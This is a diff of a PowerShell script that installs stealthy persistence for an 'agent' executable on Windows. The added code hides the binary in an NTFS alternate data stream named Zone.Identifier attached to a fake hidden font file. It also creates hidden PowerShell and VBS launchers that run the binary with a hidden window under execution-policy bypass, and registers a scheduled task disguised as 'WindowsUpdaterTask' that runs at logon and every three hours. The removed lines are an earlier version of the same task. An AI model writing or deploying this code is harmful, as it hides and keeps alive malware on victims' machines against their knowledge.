@@ -1,87 +1,67 @@
-# ---- 3. Scheduled task using only schtasks (logon + every 3 hours) ----
-$taskName = "WindowsUpdaterTask"
-$xmlFile = "$env:TEMP\task_$taskName.xml"
+$ProgressPreference = 'SilentlyContinue'
+$ErrorActionPreference = 'SilentlyContinue'
 
-# Delete existing task if present
-schtasks /delete /tn $taskName /f *>$null 2>&1
+param($args)
 
-# Build the XML with both triggers (Logon + Daily repeat every 3 hours)
-$xmlContent = @'
-<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <Triggers>
-    <LogonTrigger>
-      <UserId>{0}</UserId>
-      <Enabled>true</Enabled>
-    </LogonTrigger>
-    <CalendarTrigger>
-      <Repetition>
-        <Interval>PT3H</Interval>
-        <Duration>P0D</Duration>
-        <StopAtDurationEnd>false</StopAtDurationEnd>
-      </Repetition>
-      <StartBoundary>{1}</StartBoundary>
-      <Enabled>true</Enabled>
-      <ScheduleByDay>
-        <DaysInterval>1</DaysInterval>
-      </ScheduleByDay>
-    </CalendarTrigger>
-  </Triggers>
-  <Principals>
-    <Principal id="Author">
-      <UserId>{0}</UserId>
-      <LogonType>InteractiveToken</LogonType>
-      <RunLevel>LeastPrivilege</RunLevel>
-    </Principal>
-  </Principals>
-  <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-    <AllowHardTerminate>true</AllowHardTerminate>
-    <StartWhenAvailable>false</StartWhenAvailable>
-    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
-    <IdleSettings>
-      <StopOnIdleEnd>true</StopOnIdleEnd>
-      <RestartOnIdle>false</RestartOnIdle>
-    </IdleSettings>
-    <AllowStartOnDemand>true</AllowStartOnDemand>
-    <Enabled>true</Enabled>
-    <Hidden>false</Hidden>
-    <RunOnlyIfIdle>false</RunOnlyIfIdle>
-    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
-    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
-    <WakeToRun>false</WakeToRun>
-    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
-    <Priority>7</Priority>
-  </Settings>
-  <Actions Context="Author">
-    <Exec>
-      <Command>wscript.exe</Command>
-      <Arguments>"{2}"</Arguments>
-    </Exec>
-  </Actions>
-</Task>
-'@
-
-# Fill placeholders: userId, start boundary (now), vbsPath
-$startBoundary = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ss")
-$finalXml = $xmlContent -f $env:USERNAME, $startBoundary, $vbsPath
-
-# Write XML file with correct UTF-16 LE encoding
-# Use "unicode" (not "UTF16") – that's UTF-16 LE with BOM
-[System.IO.File]::WriteAllText($xmlFile, $finalXml, [System.Text.UnicodeEncoding]::new($false, $true))
-
-# Import task via schtasks
-schtasks /create /tn $taskName /xml "$xmlFile" /f *>$null 2>&1
-
-if ($LASTEXITCODE -eq 0) {
-    $taskCreated = $true
-    Write-Output "✅ Task '$taskName' created with logon + every-3-hour triggers."
-} else {
-    $taskCreated = $false
-    Write-Output "❌ schtasks failed (exit code: $LASTEXITCODE)."
+$agentPath = $env:AgentPath
+if (-not $agentPath) {
+    Write-Output "❌ AgentPath not set."
+    exit
 }
 
-# Cleanup
-Remove-Item $xmlFile -Force -ErrorAction SilentlyContinue
+# ---- 1. Fake font file & ADS ----
+$fontDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
+if (-not (Test-Path $fontDir)) {
+    New-Item -ItemType Directory -Path $fontDir -Force | Out-Null
+    attrib +h $fontDir
+}
+$fontFile = "$fontDir\seguibl.ttf"
+if (-not (Test-Path $fontFile)) {
+    Set-Content -Path $fontFile -Value "TTF fake font file - do not delete" -Encoding ASCII -Force
+    attrib +h $fontFile
+}
+
+$streamName = "Zone.Identifier"
+$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
+Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte
+
+# ---- 2. Launcher scripts ----
+$launcherPath = "$fontDir\run.ps1"
+$launcherContent = @"
+`$ProgressPreference = 'SilentlyContinue'
+`$fontFile = '$fontFile'
+`$streamName = '$streamName'
+`$tempAgent = "`$env:TEMP\agent.exe"
+if (Test-Path `$tempAgent) { Remove-Item `$tempAgent -Force -ErrorAction SilentlyContinue }
+`$bytes = Get-Content -Path `$fontFile -Stream `$streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
+if (`$bytes) {
+    [System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
+    Start-Process -WindowStyle Hidden `$tempAgent
+}
+"@
+Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
+attrib +h $launcherPath
+
+$vbsPath = "$fontDir\run.vbs"
+$vbsContent = @"
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$launcherPath""", 0, False
+"@
+Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII -Force
+attrib +h $vbsPath
+
+# ---- 3. Scheduled task (logon + every 3 hours) ----
+$taskName = "WindowsUpdaterTask"
+
+# Delete any existing task with the same name
+schtasks /delete /tn $taskName /f *>$null 2>&1
+
+# Create the task: runs at logon and repeats every 3 hours indefinitely
+$createCmd = "schtasks /create /tn `"$taskName`" /tr `"wscript.exe `"$vbsPath`"`" /sc onlogon /ru $env:USERNAME /f /it /ri PT3H /du 9999:59"
+Invoke-Expression $createCmd *>$null 2>&1
+
+if ($LASTEXITCODE -eq 0) {
+    Write-Output "✅ Persistence installed: task '$taskName' will run at logon and every 3 hours."
+} else {
+    Write-Output "❌ schtasks failed with exit code $LASTEXITCODE."
+}
